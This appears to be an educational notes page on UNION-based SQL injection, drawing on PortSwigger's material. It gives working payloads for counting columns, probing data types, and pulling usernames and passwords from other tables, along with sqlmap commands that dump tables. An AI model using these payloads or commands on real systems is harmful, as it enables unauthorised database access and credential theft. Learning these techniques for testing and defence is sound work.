---
title: UNION Attack
description: Introduction of UNION attack in SQL injection.
date: 2025-10-12
weight: 2
---

## `UNION` Syntax

In SQL, `UNION` is used to execute one or more additional `SELECT` queries and append results to the original query.

For example:

```sql
SELECT product, date FROM products UNION SELECT username, password FROM users
```

## Requirements of `UNION`

There are two requirements of `UNION` queries.

1. The individual queries must return the same number of columns.
2. Data types in each column must be compatible between the individual queries.

### The Same Number of Columns

The first requirement means the following statement is available

```sql
SELECT product, date FROM products UNION SELECT username, password FROM users
```

while the following one is unavailable:

```sql
SELECT product, date FROM products UNION SELECT username, password, email FROM users
```

Because the previous `SELECT` queries two columns while the later one queries three columns.

### Compatible Data Types

Suppose that `product` and `user` table have the following structures:

```text
Table product:

+-------------+----------+
| Field       | Type     |
+-------------+----------+
| id          | int      |
| name        | char(35) |
+-------------+----------+
```

```text
Table user:

+-------------+----------+
| Field       | Type     |
+-------------+----------+
| email       | char(30) |
| username    | char(35) |
+-------------+----------+
```

Then the following query will be unavailable:

```sql
SELECT id, name FROM product UNION SELECT email, username FROM user
```

Because the data types of `id` and `email` is not compatible.

## Determine Columns of Original Query

### Use `ORDER BY`

If the original query is

```sql
SELECT name, age, email FROM user WHERE name = '${user-input}'
```

Then the payload can be

- `' ORDER BY 1--`
- `' ORDER BY 2--`
- `' ORDER BY 3--`
- `' ORDER BY 4--`
- ...

The statement `ORDER BY n` means sort the result of query by column `n`. For example, the following query means sort results by `name`, which is the first column.

```sql
SELECT name, age, email FROM user WHERE name = '' ORDER BY 1--
```

When `n` is `4`, the query will be invalid because `n` is out of range $[1, 3]$, which will cause an exception in the query and the attacker can find out the number of columns.

### Use `UNION`

`UNION` requires two `SELECT` statements query the same number of columns, enabling attackers to determine how many columns are in the original query.

Suppose that the original query is

```sql
SELECT name, age FROM customer WHERE name = '${user-input}'
```

Then attackers can submit:

```sql
' UNION SELECT NULL--
```

Then the query will be

```sql
SELECT name, age FROM customer WHERE name = '' UNION SELECT NULL--
```

However, the numbers of columns are different. So the query will return an exception, and the attacker can continue to try other numbers of columns until the query is valid. For example:

- `' UNION SELECT NULL, NULL--`
- `' UNION SELECT NULL, NULL, NULL--`
- ...

This process can be done easily by using `sqlmap`.

If there is a URL with this vulnerability, like `https://example.com?id=1`, then we can use the following command to find out the column number of the original query:

```bash
sqlmap -u 'https://example.com?id=1' --technique=U
```

The argument `--technique=U` tells `sqlmap` to use `UNION` attack method only. By default, the range of columns is from 1 to 10. To modify the range, for example, to `12-16`, the command can be changed to

```bash
sqlmap -u 'https://example.com?id=1' --technique=U --union-cols=12-16
```

## Determine Data Types

After determining the number of columns, it is possible to determine the data type by using the second requirement of `UNION`.

The payload can be

- `' UNION SELECT 'a', NULL--`
- `' UNION SELECT NULL, 'a'--`

By analyzing the response, the data type of the specified column can be identified.

This process can also be done automatically by using `sqlmap`.

Suppose that `https://example.com?id=1` has this vulnerability, and the target database and table are `public` and `users` respectively, then the command may be:

```bash
sqlmap -u 'https://example.com?id=1' --technique=U --columns -D public -T users
```

The output may look like:

```text
+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | varchar |
| password | varchar |
| username | varchar |
+----------+---------+
```

## Retrieve Data of Other Tables

If a database has two tables `products` and `users`, and the website only allows query of `products` but with `UNION` SQL injection vulnerability, then we can use `UNION` to retrieve data from other tables.

If the URL is `https://example.com?id=1`, and the backend query is `SELECT id, name FROM products WHERE id = '${user-input}'`, then the `UNION` attack is possible to retrieve data from table `users` which contains two columns `username` and `password`.

The payload may be:

```url
https://example.com?id=1'+UNION+SELECT+username,+password+FROM+users--
```

Finally, the query in backend would be:

```sql
SELECT id, name FROM products WHERE id = '' UNION SELECT username, password FROM users--
```

Then the response will contain username and password information.

Also, this can be done by `sqlmap` automatically.

```bash
sqlmap -u 'https://example.com?id=1' --technique=U --dump -D public -T users
```

The output may look like:

```text
+-------+----------------------+---------------+
| email | password             | username      |
+-------+----------------------+---------------+
| NULL  | xqgqdaavmjdpn00ow03v | administrator |
| NULL  | stroi00dlirh21fagfcn | wiener        |
| NULL  | cdjms5njz9s30ahkzzb3 | carlos        |
+-------+----------------------+---------------+
```

## Retrieve Multiple Values Within a Single Column

If the original query statement only queries one column, like:

```sql
SELECT name FROM products WHERE id = '${user-input}'
```

And we want to retrieve two columns `username` and `password` from table `users`, then we can concatenate these two columns into one. For example, on `PostgreSQL`, we can use the following payload:

```sql
' UNION SELECT username || '~' || password FROM users--
```

Then the backend query will be

```sql
SELECT name FROM products WHERE id = '' UNION SELECT username || '~' || password FROM users--
```

This is valid because SQL treats concatenation as one column.

## Reference

- [PortSwigger](https://portswigger.net/web-security/sql-injection/)
